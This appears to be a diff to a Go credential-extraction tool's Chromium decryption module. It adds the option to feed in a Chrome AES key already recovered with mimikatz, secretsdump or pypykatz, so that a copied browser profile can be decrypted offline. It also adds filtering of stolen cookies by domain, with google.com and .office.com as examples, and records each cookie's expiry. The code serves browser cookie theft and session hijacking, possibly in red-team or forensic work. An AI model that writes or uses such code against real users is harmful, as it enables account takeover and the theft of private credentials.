@@ -4,11 +4,60 @@ package decrypt
 
 import (
 	"encoding/base64"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"os"
 	"path/filepath"
+	"strings"
 )
+
+// externalChromiumKey is set when the caller provides the raw Chrome AES key
+// directly (already DPAPI-decrypted). Bypasses all OS-specific key retrieval.
+var externalChromiumKey []byte
+
+// domainFilter, when non-empty, limits cookie extraction to cookies whose
+// host_key contains this string (e.g. "google.com", ".office.com").
+var domainFilter string
+
+// SetExternalChromiumKey accepts the raw Chrome AES encryption key as a hex
+// string. Use this when you already have the decrypted key from secretsdump,
+// mimikatz, or pypykatz and want to decrypt a copied Chrome profile offline.
+func SetExternalChromiumKey(hexKey string) error {
+	k, err := hex.DecodeString(hexKey)
+	if err != nil {
+		return fmt.Errorf("invalid chrome-key hex: %w", err)
+	}
+	if len(k) != 16 && len(k) != 32 {
+		return fmt.Errorf("chrome-key must be 16 or 32 bytes (got %d)", len(k))
+	}
+	externalChromiumKey = k
+	return nil
+}
+
+// SetDomainFilter limits cookie extraction to cookies matching the given domain
+// substring (e.g. "google.com"). Pass "" to disable filtering.
+func SetDomainFilter(domain string) {
+	domainFilter = strings.ToLower(domain)
+}
+
+// getMasterKeyForProfile resolves the Chromium master key for a profile,
+// preferring caller-supplied keys over OS-specific retrieval.
+//
+//   1. externalChromiumKey — caller provided raw AES key (highest priority)
+//   2. dpapiMasterKey — caller provided DPAPI masterkey → derive Chrome key
+//   3. getChromiumMasterKey — OS-specific (DPAPI/Keychain/libsecret)
+func getMasterKeyForProfile(profileDir, browserName string) (*chromiumKeys, error) {
+	if externalChromiumKey != nil {
+		return &chromiumKeys{V10: externalChromiumKey}, nil
+	}
+	if dpapiMasterKey != nil {
+		if key, err := deriveChromiumKeyFromDPAPIBlob(profileDir, dpapiMasterKey); err == nil {
+			return &chromiumKeys{V10: key}, nil
+		}
+	}
+	return getChromiumMasterKey(profileDir, browserName)
+}
 
 // localState is the JSON layout of the Chromium "Local State" file.
 type localState struct {
@@ -59,7 +108,7 @@ func DecryptChromiumProfile(profileDir, browserName string) (result []DecryptedF
 			err = nil
 		}
 	}()
-	keys, err := getChromiumMasterKey(profileDir, browserName)
+	keys, err := getMasterKeyForProfile(profileDir, browserName)
 	if err != nil {
 		return []DecryptedFinding{{
 			Category:   "Browser",
@@ -179,6 +228,9 @@ func decryptChromiumCookies(dbPath string, keys *chromiumKeys, browser string) (
 		if err := rows.Scan(&host, &name, &enc, &expires); err != nil {
 			continue
 		}
+		if domainFilter != "" && !strings.Contains(strings.ToLower(host), domainFilter) {
+			continue
+		}
 		val, err := chromiumDecryptValue(enc, keys)
 		if err != nil || len(val) == 0 {
 			continue
@@ -187,7 +239,7 @@ func decryptChromiumCookies(dbPath string, keys *chromiumKeys, browser string) (
 			Category:   "Browser",
 			Type:       "cookie",
 			File:       dbPath,
-			Key:        fmt.Sprintf("%s | %s | %s", browser, host, name),
+			Key:        fmt.Sprintf("%s | %s | %s | %d", browser, host, name, expires),
 			Value:      truncateStr(string(val), 256),
 			Confidence: ConfHigh,
 		})
